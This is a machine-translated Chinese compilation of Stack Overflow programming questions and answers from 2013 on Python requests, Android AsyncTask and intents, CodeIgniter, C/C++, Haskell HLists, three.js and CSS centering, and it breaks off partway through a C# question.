即使经过三次尝试澄清这个问题，仍然不清楚你在这里问什么，但我可以尝试抛出足够的信息，你可以找出答案。

首先，`r = requests.put(url, data = string)`返回 a `Response`，它没有 a `body`，但它确实有 a `request`，以及`history`0 个或多个重定向请求的 a ，它们都是`PreparedRequest`对象，它们确实具有`body`属性。

另一方面，如果你这样做了`r.requests.Request(method='PUT', url=url, data=string)`，那将返回 a `Request`，它必须是`prepare()`d 在它有一个主体之前。

无论哪种方式，如果我做一个简单的测试并查看结果，我发现`body`总是正确的：

```
>>> resp = requests.put('http://localhost/nosuchurl', data='abc')
>>> resp.request.body
'abc'
>>> resp = requests.put('http://localhost/redirect_to_https', data='abc')
>>> resp.history[-1].request.body
'abc'
>>> req = requests.Request(method='PUT', url='http://localhost/nosuchurl', data='abc')
>>> preq = req.prepare()
>>> preq.body
'abc' 
```

我最好的猜测是你需要在看`resp.history[0].request.body`，但你在看`resp.request.body`，或类似的东西。

如果快速入门教程中的[重定向和历史](http://docs.python-requests.org/en/latest/user/quickstart/#redirection-and-history)没有帮助，请阅读详细的 API 文档，或者只是尝试所有这些，直到你弄明白为止。

或者这样做：

```
resp = request.put('http://localhost/nosuchurl', data='abc', allow_redirects=False) 
```

然后手动进行重定向处理。

# java - 本地 blobstore 响应的强制 URL

> ID：16204691
> 
> 赞同：0
> 
> 时间：2013-04-25T00:54:45.733
> 
> 标签：java, google-app-engine

我在我的网站上使用 facebook 登录。当我在本地测试时，我需要使用`local.mysite.com`，所以 facebook 认为请求来自我的网站。这很好用，除非我将图像上传到 blobstore。上传图片时，应用引擎总是切换到`localhost:888`. 这使浏览器认为跨站点脚本正在发生并阻止我的上传。如何强制应用引擎使用`local.mysite.com`而不是`localhost:888`

这是我得到的错误：

```
XMLHttpRequest cannot load http://localhost:8888/_ah/upload/agpidWJwcm9qZWN0chsLEhVfX0Jsb2JVcGxvYWRTZXNzaW9uX18YBQw. Origin http://local.mysite.com:8888 is not allowed by Access-Control-Allow-Origin. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T06:48:31.003

我不确定您是否可以实际更改该 URL。

您可以做的是将`localhost:8888`用于本地测试并创建另一个指向 localhost 的 Facebook 应用程序。之后，您可以使用两种方法来在您的应用程序中使用这两个（或者将来可能更多）Facebook 应用程序。

*   您可以根据请求的 URL 决定使用哪个密钥
*   将所有密钥存储在某种配置 Datatstore 中，只有管理员可以更改它们

使用第一种方法，您必须以某种方式将所有密钥存储在您的代码中，或者更糟的是存储在数据存储中，然后根据 URL 决定使用哪个。这种方法不好，也不能很好地扩展。第二种方法更可取，因为您不必将密钥存储在代码中，它更安全，并且扩展性更好，因为您不需要预先知道您拥有多少不同的 Facebook 应用程序。

您可以阅读[Nick Johnson 的](https://stackoverflow.com/a/3778576/8418)关于如何在 Python 中解决该问题的答案，但这个想法是 Java，所以它不应该那么难。

# android - 即使应用程序被销毁，AsyncTask 也将始终运行？

> ID：16204693
> 
> 赞同：18
> 
> 时间：2013-04-25T00:54:58.637
> 
> 标签：android, android-asynctask, android-lifecycle

我有一个应用程序，因为你不能在我正在使用的主线程上进行网络操作`AsyncTask`，所以问题是一旦我开始活动`execute()`，然后`AsyncTask`我`finish()`就开始活动，也许用户会`finish()`使用整个应用程序，所以我我想知道的是：

1.  只要在应用程序运行时被调用，即使应用程序关闭，也总是会`AsyncTask`完成？`doInBackground()``onPostExecute()``execute()`

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-25T01:06:31.137

您将能够对此进行测试。是的，确实如此。如果调用了执行，您可以看到 Asynctask 仍将执行，除非它对前台或 UI 相关的操作。（它可能会导致启动器崩溃）。

但是，如果它靠近系统。它可能会或可能不会继续执行该方法。我已经在这里测试并回答[了](https://stackoverflow.com/questions/14611893/when-android-kills-an-app-can-a-function-be-stopped-halfway/14611934#14611934)。回复评论： 测试：

```
@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new Worker().execute();
    }
private class Worker extends AsyncTask<Void, Void, String> {

    @Override
    protected String doInBackground(Void... arg0) {
        Log.i("SomeTag",
                "start do in background at " + System.currentTimeMillis());
        String data = null;

        try {
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(
                    "https://stackoverflow.com/questions/tagged/android");

            HttpResponse httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            data = EntityUtils.toString(httpEntity);
            Log.i("SomeTag",
                    "doInBackGround done at " + System.currentTimeMillis());
        } catch (Exception e) {
        }
        return data;
    }

    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute(result);
        Log.i("SomeTag", System.currentTimeMillis() / 1000L
                + " post execute \n" + result);
    }
}

@Override
protected void onDestroy() {
    super.onDestroy();
    Log.i("SomeTag", System.currentTimeMillis() / 1000L + "  onDestory()");
}

04-24 21:42:57.981: I/SomeTag(5961): start do in background at 1366854177994
04-24 21:43:00.974: I/SomeTag(5961): 1366854180  onDestory()
04-24 21:43:02.946: I/SomeTag(5961): doInBackGround done at 1366854182946
04-24 21:43:02.946: I/SomeTag(5961): 1366854182 post execute 
04-24 21:43:02.946: I/SomeTag(5961): <!DOCTYPE html>
04-24 21:43:02.946: I/SomeTag(5961): <html>
04-24 21:43:02.946: I/SomeTag(5961): <head>
04-24 21:43:02.946: I/SomeTag(5961):         
04-24 21:43:02.946: I/SomeTag(5961):     <title>Newest &#39;android&#39; Questions - Stack Overflow</title>
04-24 21:43:02.946: I/SomeTag(5961):     <link rel="shortcut icon" href="http://cdn.sstatic.net/stackoverflow/img/favicon.ico">
//.... 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-25T01:10:16.937

`onPostExecute()`从 UI 线程调用 - 因此如果 UI 线程不再运行，它将不会继续运行。但是`doInBackGround()`，它是从一个单独的工作线程运行的，因此它将一直运行直到完成（或者如果 JVM 进程被操作系统杀死，这也是一种可能性）。请注意，仅建议将 AsyncTasks 用于较短的 UI 绑定后台任务，而不是长时间运行的后台工作（几秒钟）。

简而言之，您不能假设它会继续运行，也绝对不能假设它会发布进度或调用`onPostExecute()`。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-12-04T07:41:38.297

当您在 Activity 上调用 finish() 时，Activity 会被销毁，但主线程不会。[注意：活动在主线程上运行。活动不是主线程。]

因此，后台线程上的 doInBackground() 和主线程上的 onPostExecute() 将被执行。但是，如果 onPostExecute() 执行任何与 UI 相关的任务，您将获得 ANR，因为此时没有 UI。例如，如果您只是在 onPostExecute() 中打印 Log.d() 语句，则该语句将在 Logcat 中可见。

** 只有当进程处于活动状态且未被 Android Low Memory Killer 杀死时，这些才是可能的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-05-28T17:06:13.400

查看图像以查看在哪个线程中执行了哪些方法。

[![在此处输入图像描述](https://i.stack.imgur.com/mplVr.jpg)](https://i.stack.imgur.com/mplVr.jpg)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-07-11T10:03:11.573

您可以轻松地对此进行测试，只需`doInBackground()`延长持续时间，例如添加`Thread.sleep(5000)`然后尝试各种场景：

*   如果您完成启动 AsyncTask 的 Activity，或者离开它，AsyncTask 会正常完成，但是`onPostExecute()`如果您持有对周围 Activity 的引用（如 UI 元素） ，您可能会导致内存泄漏或应用程序崩溃，那不再是“活着的”了。
*   如果您通过按“主页”按钮最小化您的应用程序，它将再次正常完成，但可能会使应用程序崩溃`onPostExecute()`
*   如果您杀死您的应用程序进程（或系统这样做），它将终止您的 AsyncTask 并且您希望它执行的工作`doInBackground()`将不会完成。如果您只是使用启动线程也是如此`new Thread(new Runnable() {...`

# c - 有效地检查字谜？

> ID：16204694
> 
> 赞同：0
> 
> 时间：2013-04-25T00:55:03.710
> 
> 标签：c, algorithm

检查 2 个字符串（由 const char * 表示）是否是字谜的最有效方法是什么？我知道我们可以排序然后比较。但是，排序是 nlogn。

谢谢您的帮助。

编辑：我因为没有展示我的尝试而投了反对票。所以，我的尝试如下：

```
int anagram(const char * c1, const char *c2){
 char *s1=my_sort(c1);
 char *s2=my_sort(c2);
 return strcmp(s1,s2)==0?1:0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T00:56:17.480

它来自我的一篇博文：）

```
/**
* Works for 0-127 ASCII string
**/
int isanagram(const char* s1,const char* s2){
    int hash[128];
    int i;
    for(i=0;i<128;i++)
        hash[i]=0;
    while(*s1) hash[*s1++]++;
    while(*s2) hash[*s2++]--;
    for(i=0;i<128;i++)
        if(hash[i]) return 0;
    return 1;
} 
```

解释：字母表中的每个字符在哈希表中都有一个位置。对于 s1 中的每个 char，我们增加该 char 的计数，对于 s2 中的每个 char，我们减少哈希表中 char 的计数。如果所有字符最后的计数为 0，则 s1 和 s2 的每个字符的数量相同，这就是 anagram 的定义。

复杂度： O(n) 如果 n>128 ，其中 n 是 s1 和 s2 长度的最大值

# android - 当用户按下返回按钮然后按下最近的应用程序按钮时，意图数据未清除

> ID：16204700
> 
> 赞同：7
> 
> 时间：2013-04-25T00:55:37.843
> 
> 标签：android, android-intent

我对我正在开发的应用程序中遇到的这种行为感到困惑......

**短的：**

当用户按下后退按钮离开应用程序然后按下最近按钮重新进入应用程序时，意图数据不会被清除。（每隔一种情况，意图数据被清除）

**长：**

我有一个带有启动屏幕的应用程序，用于收集从 URI 方案传入的数据。然后，我设置了将数据转发到主要活动的意图。主要活动有片段并且基于主/细节模板。

Intent数据在所有情况下都会被清除，例如按home键然后返回应用程序，按最近的应用程序按钮然后返回应用程序等。唯一没有清除intent数据的情况是当用户按下后退按钮然后按下最近的应用程序按钮以返回应用程序时。

涉及意图的相关代码片段：

```
// Splash Screen Activity
@Override
protected void onPostExecute(Void result) {
    // Data is done downloading, pass notice and app ids to next activity
    Intent intent = new Intent(getBaseContext(), ListActivity.class);
    intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
    intent.putExtra("id1", id1);
    intent.putExtra("id2", id2);
    intent.putExtra("id3", id3);
    startActivity(intent);
    finish();
}

// ListActivity retrieving intent data
Intent intent = getIntent();
if (intent != null) {
    this.id1 = intent.getExtras().getString("id1");
    this.id2 = intent.getExtras().getString("id2");
    this.id3 = intent.getExtras().getString("id3");
}

// ListActivity clearing intent data
@Override
public void onPause() {
    super.onPause();
    // Clear intent data
    Intent intent = getIntent();
    intent.putExtra("id1", "");
    intent.putExtra("id2", "");
    intent.putExtra("id3", "");
} 
```

我想指出我也尝试过使用 intent.removeExtra("id1") 但这也不起作用。

知道发生了什么吗？即使总是调用 onPause() 来清除 Intent 数据，Android 也好像保留了旧的 Intent。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2014-06-19T21:39:42.880

实际上这是由于 Android 从历史记录中启动应用程序，因此意图附加功能仍然存在

参考这个问题[Android: Starting app from 'recent applications' 使用意图中使用的最后一组附加功能启动它](https://stackoverflow.com/questions/4866149/android-starting-app-from-recent-applications-starts-it-with-the-last-set-of)

所以添加这个条件来处理这个特殊情况为我修复了它

```
int flags = getActivity().getIntent().getFlags();       
if ((flags & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0) {
    // The activity was launched from history
    // remove extras here
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T02:15:51.790

我相信这里的区别在于 Back 键实际上导致您的 Activity 完成，而按 Home 会导致您的 Activity 暂停，但未完成。
因此，当您的进程在 Home 案例中回到最前面时，它只是恢复一个已经存在的 Activity 实例，而在 Back 案例中，系统正在实例化您的 Activity 的新副本，调用`onCreate()`并将新副本交给它为该活动记录的最后一个意图。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T15:43:48.110

在`onPause()`您清除“**副本**”中的附加内容时`Intent`。您可以尝试添加

```
setIntent(intent); 
```

在`onPause()`您清除附加内容之后（尽管调用`removeExtra()`可能也可以工作，而不是将附加内容设置为空字符串）。

**注意：** 但是，我认为这种设计是有缺陷的。您不应该使用`Intent`来跟踪应用程序中的状态。您应该在共享首选项中保存一些状态，因为这将在您的应用程序被杀死/重新启动、手机重新启动或其他任何情况下继续存在。

问题是 new`Intent`没有持久化，所以如果用户按下 HOME 按钮并且你的应用程序进入后台，然后 Android 因为它不活动而杀死你的应用程序，当用户返回应用程序时，Android 会创建一个您的应用程序的新流程，它将使用**原始 Intent**重新创建活动。

此外，如果您阅读文档，`getIntent()`它会说它返回**启动活动的 Intent**。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-29T02:58:33.967

为了解决我面临的问题，我选择使用 SharedPreferences 作为在活动之间传递数据的一种方式。

我知道 SharedPreferences 通常不用于此目的，但它解决了我的问题并且有效。

# php - 如何在 Codeigniter 中获得实际的错误消息？

> ID：16204705
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:56:54.510
> 
> 标签：php, codeigniter, wamp

我收到此错误消息：

> 遇到错误
> 
> 您请求的操作是不允许的。

但我在日志中找不到任何内容，页面上也没有显示任何内容。这发生在我提交表单之后。如何获得实际的技术错误消息？

作为记录，这个表单/页面在 LAMP 上工作得很好，并且只在我在我的 WAMP 机器上测试它时显示这个消息。真的很混乱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T15:46:22.083

您的选项是设置`csrf_protection`或`FALSE`使用该`form_open`功能

请参阅[http://ellislab.com/codeigniter/user-guide/libraries/security.html](http://ellislab.com/codeigniter/user-guide/libraries/security.html)：

> 您可以通过打开 application/config/config.php 文件并设置以下内容来启用 csrf 保护：
> 
> $config['csrf_protection'] = 真；如果您使用表单助手，form_open() 函数将自动在表单中插入隐藏的 csrf 字段。

错误来自第 205 行`system/core/Security.php`

```
public function csrf_show_error()
{
    show_error('The action you have requested is not allowed.');
} 
```

# android - 在范围内时自动连接到蓝牙设备

> ID：16204712
> 
> 赞同：0
> 
> 时间：2013-04-25T00:57:44.217
> 
> 标签：android, bluetooth

我得到了一个基于 Android 蓝牙聊天示例的应用程序，我试图修改服务以在后台持续运行。我想这样做，以便它可以在我接近设备时搜索并连接到设备，而不必打开应用程序并手动连接。我遇到了两个问题：

更改编辑

1.  如何确定启动时是否已经存在连接

2.  如果服务正在运行，我如何在应用启动时重新连接到服务

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-29T21:18:16.733

1.  您可以使用 SharedPreference 来跟踪“isConnected”变量。您在此处将变量设置为 true：case BluetoothChatService.STATE_CONNECTED：

此处为假：案例BluetoothChatService.STATE_NONE：

2：保留一份MAC地址，直接连接即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T04:42:43.237

好吧，如果我遇到了你的问题。您应该在后台服务中使用 TimerTask 方法，并且您的 TimerTask 方法将在某个时间间隔内连续执行并将您的方法放入其中以检查蓝牙范围，如果找到范围则调用连接蓝牙的方法。

# php - 删除除括号中的文本以外的所有内容

> ID：16204715
> 
> 赞同：0
> 
> 时间：2013-04-25T00:57:57.013
> 
> 标签：php

我在下面有一个脚本，但它正在输出以下测试）而不是所需的测试。理想情况下，我试图保留括号之间的所有内容并摆脱其他所有内容。

```
$value= Test (Testing)
echo substr($value, strpos($value, "(") +1, strpos($value, ")") - strpos($value, "(")); 
```

仅使用括号之间的文本创建新字符串的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:59:34.613

尝试这个：

```
echo preg_replace("/.*\((.*?)\).*/","$1",$value); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:59:37.197

从长度参数中减去一[`substr()`](http://php.net/substr)：

```
$value = 'Test (Testing) Text';
$left = strpos( $value, "(");
echo substr( $value, $left + 1, strpos( $value, ")") - $left - 1); 
```

这[输出](http://3v4l.org/r6qhq)：

```
Testing 
```

# c++ - 求最大、最小、正负

> ID：16204718
> 
> 赞同：0
> 
> 时间：2013-04-25T00:58:26.950
> 
> 标签：c++

我写了这段代码，我希望它找到负数、最小数、最大数、数字的平均值和数字的总和

它不起作用，你能帮我使用`if`语句吗？我找不到最小或最大（当数字为负数时）+ 无法找到所有数字是负数还是正数或混合。

```
#include <iostream>
using namespace std;

void main() {
    float num,
        average,
        sum,
        smallest,
        largest,
        positive,
        negative;

    int count;
    sum = 0;
    count = 1;
    largest = 0;
    smallest = 0;
    negative = 0;

    while (count < 11) {
        cout << "Number #" << count << ": ";
        cin >> num;

        if (num < 0) negative++;

        sum += num;
        average = (sum / 10);

        if (num > largest) largest = num;
        else if (num < smallest) smallest = num;

        count++;
    }

    cout << endl << "The smallest number is " << smallest << endl;
    cout << "The largest number is " << largest << endl;
    cout << "The average of all numbers is " << average << endl;
    cout << "The sum of all numbers is " << sum << endl;
    cout << endl;
    cout << "There are " << negative << " negative numbers." << endl;

    if (num > 0) cout << "All numbers are positive.";
    else if (sum < 0) cout << "All numbers are negative.";
    else if {
        cout << "There is a mixture of numbers.";
    }
} 
```

//------------------------------------ **编辑**

我做了一些改变，我几乎是对的，但我仍然找不到找到最小和最大的方法

```
using namespace std;

void main()
{

float num,
average,
sum,
largest,
smallest,
positive,
negative;

int count;
sum = 0;
count = 1;
negative = 0;

largest= 0;
smallest = 0;

while ( count < 11)
{
  cout << "Number #" << count << ": ";
  cin >> num;

  if ( num < 0 )negative++;

  sum += num;

  if (count != 0 )
  {
     if ( num > largest )
        largest = num;
     else if ( num < smallest )
        smallest = num;
  }

  count++;
} 

average = ( sum / 10 );

cout << endl << "The smallest number is " << smallest << endl;
cout << "The largest number is " << largest << endl;
cout << "The average of all numbers is " << average << endl;
cout << "The sum of all numbers is " << sum << endl;
cout << endl;
cout << "There are " << negative << " negative numbers." << endl;

 if ( negative == 0 )
    cout << "All numbers are positive.";
 else if ( negative == 10 )
    cout << "All numbers are negative.";
 else 
 {
    cout << "There is a mixture of numbers.";
 }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:06:35.407

在获得所有数字之前，您不应该计算平均值；或者如果你想保持一个运行平均值，你必须除以你到目前为止的总和。所以代替线

```
average = sum / 10; 
```

在循环的中间，尝试

```
average = sum / count; 
```

while 在循环内，或

```
average = sum / (count - 1); 
```

循环之后。当然，由于在循环完成之前您实际上并没有*使用*平均值，所以这实际上并不重要 - 但它有点草率。

接下来，您的代码

```
if ( num > 0 )
   cout << "All numbers are positive.";
else if ( sum  < 0 )
   cout << "All numbers are negative."; 
```

有两个明显的错误。首先-您检查“num”是否为正-这是输入的最后一个数字，而不是“所有数字”。如果您有一个非常负的数字，则总和将为负数。而是使用您的负数计数：

```
if ( negative == 0) // all positive
if ( negative == 10) // all negative 
```

否则，它是一个混合物。我相信您可以使用这些指针修复您的代码。

**编辑#2**

我决定在一个完整的程序中实现我上面提到的所有更改，以及我在评论中提到的更改。我最终得到的代码是这样的：

```
#include <iostream>
using namespace std;

int main()
{

float num,
  average,
  sum=0,
  largest=0,
  smallest=0,
  positive=0,
  negative=0;

int count=1;

negative = 0;

while ( count < 11)
{
  cout << "Number #" << count << ": ";
  cin >> num;

  if ( num < 0 ) negative++;

  sum += num;

  if (count == 1) {
    largest = num;
    smallest = num;
  }
  else {
     if ( num > largest )
        largest = num;
     if ( num < smallest )
        smallest = num;
  }

  count++;
}

average = ( sum / (count - 1) );

cout << endl << "The smallest number is " << smallest << endl;
cout << "The largest number is " << largest << endl;
cout << "The average of all numbers is " << average << endl;
cout << "The sum of all numbers is " << sum << endl;
cout << endl;
cout << "There are " << negative << " negative numbers." << endl;

if ( negative == 0 )
  cout << "All numbers are positive."<<endl;
else if ( negative == 10 )
  cout << "All numbers are negative."<<endl;
else
{
  cout << "There is a mixture of numbers.";
}

} 
```

这编译得很好；当我运行它并输入以下输入时：

```
Number #1: 5
Number #2: 4
Number #3: 3
Number #4: 2
Number #5: 1
Number #6: 0
Number #7: -1
Number #8: -2
Number #9: -3
Number #10: -4 
```

我得到这个输出：

```
The smallest number is -4
The largest number is 5
The average of all numbers is 0.5
The sum of all numbers is 5

There are 4 negative numbers.
There is a mixture of numbers. 
```

在我看来它正在工作。对你起作用吗？

# haskell - HList 项目的共享约束

> ID：16204719
> 
> 赞同：6
> 
> 时间：2013-04-25T00:58:28.593
> 
> 标签：haskell, hlist

假设我们对 HList 有如下定义：

```
data HL spec where
  HLNil :: HL ()
  HLCons :: h -> HL t -> HL (h, t) 
```

**是否有可能以某种方式对其项目实施共享约束？**

例如，以下是我尝试将项目限制为具有`Show`实例，但失败并显示`Couldn't match type `Char' with `Int'`：

```
class HLSpecEach spec item
instance HLSpecEach () item
instance (HLSpecEach t item, h ~ item) => HLSpecEach (h, t) item

a :: (Show item, HLSpecEach spec item) => HL spec -> Int
a = undefined

b :: HL (Int, (Char, ()))
b = undefined

c = a b 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T01:49:22.363

如果您有约束类型和类型族，则很容易做到。首先，让我说`DataKinds`为了清楚起见我更喜欢使用

```
data HList ls where
  HNil :: HList '[]
  HCons :: x -> HList xs -> HList (x ': xs)

type family ConstrainAll (c :: * -> Constraint) (ls :: [*]) :: Constraint
type instance ConstrainAll c '[] = ()
type instance ConstrainAll c (x ': xs) = (c x, ConstrainAll c xs)

showAll :: ConstrainAll Show xs => HList xs -> [String]
showAll HNil = []
showAll (HCons x xs) = (show x) : showAll xs 
```

如果你不使用新的扩展，它是可能的，但更丑陋。一种选择是为所有内容定义自定义类

```
class ShowAll ls where
  showAll :: HList ls -> [Show]
instance ShowAll () where
  showAll _ = []
instance (ShowAll xs, Show x) => ShowAll (x,xs)
  showAll (HCons x xs) = (show x) : (showAll xs) 
```

我觉得很难看。一个更聪明的方法是伪造约束类型

```
class Constrained tag aType where
  isConstained :: tag aType

data HListT tag ls where
  HNilT :: HListT tag ()
  HConsT :: x -> tag x -> HListT tag xs -> HListT tag (x,xs)

data Proxy (f :: * -> *) = Proxy 
class ConstainedAll tag ls  where
  tagThem :: Proxy tag -> HList ls -> HListT tag ls
instance ConstainedAll tag () where
  tagThem _ _ = HNilT
instance (ConstainedAll tag xs, Constrained tag x) => ConstainedAll tag (x,xs) where
  tagThem p (HCons x xs) = HConsT x isConstained (tagThem p xs) 
```

然后你可以使用它

```
data Showable x where Showable :: Show x => Showable x
instance Show x => Constrained Showable x where isConstained = Showable

--inferred type showAll' :: HListT Showable xs -> [String]
showAll' HNilT = []
showAll' (HConsT x Showable xs) = (show x) : showAll' xs

--inferred type: showAll :: ConstainedAll Showable xs => HList xs -> [String]
showAll xs = showAll' (tagThem (Proxy :: Proxy Showable) xs)

example = showAll (HCons "hello" (HCons () HNil)) 
```

它应该（尚未测试）与任何具有 GADT、MPTC、灵活上下文/实例和种类签名的 GHC 一起使用（您可以轻松摆脱最后一个）。

编辑：在 GHC 7.6+ 你应该使用

```
type family ConstrainAll (c :: k -> Constraint) (ls :: [k]) :: Constraint 
```

（`k`而不是`*`）并打开 PolyKinds，但这不适用于 PolyKinds 的 GHC 7.4 实现（因此是单态代码）。同理，定义

```
data HList f ls where
  HNil :: HList f '[]
  HCons :: !(f x) -> !(HList f xs) -> HList f (x ': xs) 
```

当您想要惰性与严格的 HLists 或想要字典列表或更高种类的通用变体等时，可以避免代码重复。

# camera - three.js：平移相机后围绕原点旋转

> ID：16204720
> 
> 赞同：1
> 
> 时间：2013-04-25T00:58:40.463
> 
> 标签：camera, rotation, three.js, pan

我有一个带有网格的平面/板，大约为 1100 x 1100。我有平移、缩放和旋转工作，除了板在平移后移回屏幕中心的事实。所以，如果我根本不平移电路板，那么一切正常。平移板后，当我尝试旋转板时，它会移回屏幕中心。我不知道如何更改相机的原点，使其围绕板的中心旋转。它似乎围绕着相机的中心旋转。

var 半径 = 1500, theta = 45 * 0.5, onMouseDownTheta = 45 * 0.5; 变量 fov = 45; var mouse2D = new THREE.Vector3(0, 10000, 0.5);

cameraX = 半径 * Math.sin(THREE.Math.degToRad(theta)); 相机Y = 1000；cameraZ = 半径 * Math.cos(THREE.Math.degToRad(theta));

camera = new THREE.PerspectiveCamera(fov, window.innerWidth / window.innerHeight, 1, 10000); camera.position.set(cameraX, cameraY, cameraZ);

场景 = 新的三个场景（）；camera.lookAt(scene.position);

使成为（）;

ThreeBoard.prototype.render = function() {

```
mouse2D.x = (event.clientX / window.innerWidth) * 2 - 1;
mouse2D.y = - (event.clientY / window.innerHeight) * 2 + 1;

// rotate
if (isMouseDown && isShiftPressed && !isCtrlPressed) {
    theta = ((event.pageX - mouse2D.x) * 0.5) + onMouseDownTheta;

    cameraX = radius * Math.sin(THREE.Math.degToRad(theta));
    cameraZ = radius * Math.cos(THREE.Math.degToRad(theta));

    camera.position.set(cameraX, cameraY, cameraZ);

    camera.lookAt(scene.position);
}

// pan
if (isMouseDown && isShiftPressed && isCtrlPressed) {
    theta = ((event.pageX - mouse2D.x) * 0.5) + onMouseDownTheta;

    cameraX += 10 * mouse2D.x;
    // cameraY += 10;
    cameraZ -= 10 * mouse2D.y;

    camera.position.set(cameraX, cameraY, cameraZ);

    // camera.lookAt(scene.position);
}

renderer.render(scene, camera); 
```

};

# html - CSS：如何将一个定位到父元素的中间

> ID：16204727
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:59:28.007
> 
> 标签：html, css

这是链接：[http ://www.cssdesk.com/PYBRZ](http://www.cssdesk.com/PYBRZ)

帮助，我不能让那个元素（或任何不同大小的元素）将自己定位到父元素的中间。我已经解决了2天，仍然找不到解决此问题的方法。

* * *

这是更新的链接：[http ://www.cssdesk.com/W3MvQ](http://www.cssdesk.com/W3MvQ)

尽管如此，它不会将自己定位到中间，它只是去中心:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:00:58.933

让`margin:auto`图像**水平**居中对齐。

```
.overlay img
{
   display: block; 
   margin-left: auto; 
   margin-right: auto; 
} 
```

这是来自 W3C 居中图像标准。请参阅此[http://www.w3.org/Style/Examples/007/center.en.html](http://www.w3.org/Style/Examples/007/center.en.html)

因为您的 div 是固定位置的，所以**垂直**对齐不是直截了当的。相反，您可以将背景添加到您的 div

```
background:url("http://oi46.tinypic.com/56612.jpg") no-repeat center center 
```

试试这个：- [http://www.cssdesk.com/nSyPa](http://www.cssdesk.com/nSyPa)

```
<div id="overlay">

</div>

#overlay {
  background: black url('http://oi46.tinypic.com/56612.jpg') no-repeat center center;
  position: fixed;
  top:0;
  left:0;
  width: 100%;
  height: 100%;
  z-index:1000;
  text-align: center;
} 
```

您也可以在图像上使用 margin-top ，但这将更加令人头疼，并且您必须根据各种分辨率等计算边距。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:03:15.010

OP 表示与中间垂直对齐请注意，此答案分为两部分：

你需要的有点棘手。您需要知道父级的高度，以便应用顶部边距、顶部填充，甚至使用绝对位置的顶部和左侧值；

例如看这个：

```
#overlay {

  background: black;
  position: fixed;
  top:0;
  left:0;
  width: 100%;
  height: 700px;
  z-index:1000;
  text-align:center;

}

#overlay img {
  margin-top:100px
} 
```

使用 JavaScript，您可以动态检测父级的高度，以便相应地对子级应用一些样式。

您还可以让父级不带任何尺寸并添加特定的填充，这样父级将采用子级的大小加上周围的填充：

```
 #overlay {

      background: black;
      position: fixed;
      top:0;
      left:0;
      z-index:1000;
      padding:80px;

    }

    #overlay img {
       /*nothing in here unless you need any other style*/

    } 
```

****第一个答案******

 **有很多方法，给父母风格`text-align:center`

```
#overlay {
  display: table;
  background: black;
  position: fixed;
  top:0;
  left:0;
  width: 100%;
  height: 100%;
  z-index:1000;
  text-align:center;
} 
```

或将图像转换为具有特定 with 和 margin auto 的块：

```
#overlay img {

  display:block;
  width:100px;
  margin:auto

} 
```

图像的默认值是 inline-block ，这使它充当文本，这就是为什么 text-align center to parent 起作用的原因，另一方面，如果你把它做成一个块，具有特定的 with 和 margin auto 你保证它不被视为文本，并将在所有浏览器中居中。

由于您有不同的尺寸并且无法指定宽度，因此只需在您的示例中执行以下操作，请尝试：

```
#overlay img {

  display: block;
  margin:auto;

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:37:55.787

您可以尝试以下 CSS：

```
html, body {
    height: 100%;
    width: 100%;
}

#overlay {
    position:relative;
    background: black;
    width: 100%;
    height: 100%;
}

#overlay img {
    position:absolute;
    top:0;
    bottom:0;
    left: 0;
    right: 0;
    margin: auto;
    outline: 1px dotted yellow;
} 
```

并查看以下 jsFiddle：http: [//jsfiddle.net/audetwebdesign/UwJZw/](http://jsfiddle.net/audetwebdesign/UwJZw/)

**这是如何工作的**

您`position: relative`在父容器 ( `#overlay`) 上进行设置，并将宽度设置为 100%，将高度设置为 100%。请注意，要使高度起作用，您需要将高度设置为根元素 ( `<html>`) 和`<body>`100%。

诀窍是`<img>`绝对定位并将顶部/底部/左侧/右侧位置设置为零，然后将边距设置为自动，这将水平和垂直居中。

好处是无论图像大小如何，它都可以工作，不需要数学。

我添加了一个黄色轮廓以显示图像的边缘，这不会影响解决方案。

请注意，根据播放的浏览器 chrome 的数量，100% 的高度可能会触发垂直滚动条。考虑到页面布局的其余部分，您需要考虑如何最好地围绕它进行设计。

另一方面，如果你有固定高度的容器，这就像一个魅力，特别是对于照片画廊等。

该技术基于 CSS 2.1，因此它应该可以在相当多的浏览器中使用。**

# c# - 如何在循环内修剪

> ID：16204730
> 
> 赞同：2
> 
> 时间：2013-04-25T00:59:36.673
> 
> 标签：c#, asp.net-mvc-4

我正在尝试使用以下 C# 代码输出到文本文件。问题是我输出的信息末尾有一个逗号，这不适用于之后使用该文件的程序。我试图弄清楚如何摆脱这个逗号......

```
var toFile = Path.Combine(GetTextPath(),
    string.Format(heatname + "_{0}.txt", DateTime.Now.ToString("yyyyMMdd")));
